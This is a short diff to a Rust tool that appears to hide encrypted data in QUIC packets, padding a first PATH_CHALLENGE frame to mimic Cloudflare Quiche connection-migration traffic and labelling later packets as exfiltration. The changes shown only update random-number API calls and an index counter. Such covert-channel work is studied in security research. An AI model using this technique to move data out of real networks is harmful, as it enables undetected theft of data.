@@ -41,8 +41,7 @@ use clap::Parser;
 use encoder::encrypt_payload;
 use etherparse::{PacketHeaders, PayloadSlice};
 use pcap::{Capture, Device};
-use rand::prelude::*;
-use rand::{thread_rng, Rng};
+use rand::{prelude::*, rng};
 use sha3::{Digest, Sha3_256};
 use std::collections::HashMap;
 use std::io;
@@ -327,20 +326,21 @@ fn main() {
                                 // PATH_CHALLENGE frame should be at least 1200 bytes
                                 if first {
                                     dbg!("Sending PATH_CHALLENGE...");
-                                    let mut rng: ThreadRng = thread_rng();
+                                    let mut rng: ThreadRng = rng();
                                     let path_challenge_frame_length: usize =
                                         1350 - quic_packet.dcid_len as usize - 1; // set to simulate length of Cloudflare Quiche Connection Migration Packets
                                     let random_path_challenge_frame: Vec<u8> = (0
                                         ..path_challenge_frame_length)
-                                        .map(|_| rng.gen())
+                                        .map(|_| rng.random())
                                         .collect();
                                     quic_packet.remaining_payload = random_path_challenge_frame;
                                     first = false;
                                 } else {
                                     dbg!("Exfiltrating using a normal protected payload packet...");
-                                    quic_packet.remaining_payload = payloads[i].clone();
-                                    i += 1;
+                                    quic_packet.remaining_payload = payloads[i-1].clone();
                                 }
+
+                                i += 1;
 
                                 // set random spin bit
                                 // let bit_mask = 1 << 5;
